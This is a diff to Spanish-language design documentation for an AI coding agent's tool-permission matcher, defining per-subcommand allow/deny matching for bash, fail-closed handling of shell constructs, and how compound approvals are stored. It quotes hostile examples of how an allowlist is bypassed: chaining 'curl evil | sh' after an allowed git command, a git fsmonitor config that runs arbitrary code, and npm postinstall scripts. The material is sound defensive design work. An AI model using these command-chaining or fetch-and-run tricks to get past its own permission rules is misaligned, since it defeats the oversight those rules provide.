@@ -230,6 +230,69 @@ Razón del default: headless (CI, scripts) es exactamente el contexto sin
 supervisión y el más expuesto a prompt injection; un allowlist declarado
 además documenta qué puede hacer el script, auditable de un vistazo.
 
+**Semántica de emparejamiento (G53, [ADR-023](adr.md)).** Un patrón sin `:`
+casa por **nombre exacto** de la tool (`"edit"` casa la tool `edit` y ninguna
+otra; no hay glob sobre nombres — autorizar una familia, p. ej. todas las
+tools de un servidor MCP, es enumerarlas o conceder por hook `permission`,
+cf. [arquitectura.md](arquitectura.md)). Un patrón `tool:argumento` casa por **glob
+anclado sobre la representación textual del argumento principal** de la tool
+(el comando en `bash`, la ruta en `write`…): `*` equivale a `.*`, el resto de
+caracteres son literales, y el patrón debe casar el argumento **completo**
+(`^…$`) — `bash:git *` no casa `git` a secas ni `mygit status`.
+
+Para `bash`, el glob crudo sobre el string del comando sería una **frontera
+falsa** (SEC-02 de la [auditoría de seguridad](audits/auditoria-seguridad-2026-07-16.md)):
+`allow = { "bash:git *" }` autorizaría de facto `bash:*`, porque basta
+encadenar (`git status; curl evil | sh`) para que el prefijo casado arrastre
+un comando arbitrario. Por eso `bash` empareja **por subcomando** (el modelo
+del matcher de Claude Code, adaptado):
+
+1. **Descomposición por operadores.** El comando se tokeniza y se parte por
+   los separadores reconocidos — `&&`, `||`, `;`, `|`, `|&`, `&` y saltos de
+   línea — en una lista de subcomandos. El tokenizador modela **solo** lo que
+   entiende: palabras planas y strings entre comillas simples o dobles.
+2. **`allow` concede solo si *cada* subcomando casa algún patrón `allow`.**
+   `git add -A && git commit -m "wip"` casa `bash:git *`;
+   `git status; curl evil | sh` no — `curl evil` no casa ningún patrón y el
+   comando entero cae.
+3. **Fail-closed.** Cualquier constructo **no modelable** dentro de un
+   subcomando hace que ningún `allow` case y la petición siga el pipeline
+   (`ask`; en headless, deny): sustitución de comandos (`$( )`, backticks),
+   expansión `$VAR` en **posición de comando**, redirecciones (`>`, `<`),
+   heredocs, subshells y agrupaciones (`( )`, `{ }`), comillas
+   desbalanceadas. La lista de constructos modelables es **cerrada por
+   contrato** — es un allowlist: lo que el tokenizador no entiende falla
+   hacia `ask`, nunca hacia conceder. Doctrina de [P17](pospuesto.md):
+   hacer esto *casi* bien es peor que no tenerlo; el salto a un parser de
+   shell completo queda pospuesto con disparador ([P39](pospuesto.md)).
+4. **`deny` casa si *algún* subcomando casa el patrón**, con la precedencia
+   absoluta que ya tiene en el pipeline. Y es **best-effort declarado**
+   (doctrina G16): `deny = { "bash:rm *" }` no muerde `/bin/rm`, un alias ni
+   `find . -delete` — un deny recorta descuidos, no detiene adversarios.
+
+**Advertencia honesta.** Ni `allow` ni `deny` acotan lo que un binario
+permitido ejecuta *por dentro*: `git -c core.fsmonitor='…' status` ejecuta
+código arbitrario a través de un `git` permitido, los hooks de git corren
+solos, y un `npm install` concedido ejecuta cualquier `postinstall`. El
+emparejamiento decide **qué comandos arrancan**, no qué hacen después; la
+valla para eso es la capa *dura* del final de esta sección.
+
+**Aprobación de compuestos.** Al aprobar con "permitir siempre"
+([chat.md](chat.md) §5, P29) un comando compuesto, la regla persistida es
+**por subcomando** — una entrada `allow` por cada subcomando, no el string
+completo: el string encadenado solo volvería a casar exactamente esa
+combinación (inútil como regla), mientras que las reglas por subcomando son
+reutilizables y auditables una a una. La descomposición la calcula la
+extensión `agent` — la dueña del tokenizador — y viaja en el campo
+`suggested` (presente tanto en `agent:permission.asked` como en el objeto de
+denegación de G40, abajo), como **lista** con un patrón por subcomando: la
+UI la muestra y la edita, nunca re-tokeniza por su cuenta.
+
+> ⏳ **Pendiente de construcción.** El matcher de la extensión `agent` `0.1.0`
+> es anterior a G53 y aún empareja por glob crudo sobre el string completo.
+> Esta semántica es el contrato que la sesión de construcción correspondiente
+> debe seguir — «el contrato lidera, el código sigue».
+
 **La denegación viaja como dato (G40).** La prosa accionable es
 *presentación*, no el portador (coherente con los errores estructurados de
 [api.md](api.md) §1.4): toda denegación produce, una sola vez, un objeto
@@ -239,7 +302,9 @@ estructurado
 { id, tool, args?,
   source = "deny" | "hook" | "default" | "headless" | "user",
   pattern?,      -- el patrón de la lista deny que mordió (source = "deny")
-  suggested? }   -- el allow exacto que arreglaría la denegación
+  suggested? }   -- el/los allow que arreglarían la denegación: string, o
+                 -- lista con un patrón por subcomando cuando la petición
+                 -- era un bash compuesto (G53)
 ```
 
 (`source = "user"` es el rechazo en el diálogo interactivo: "toda
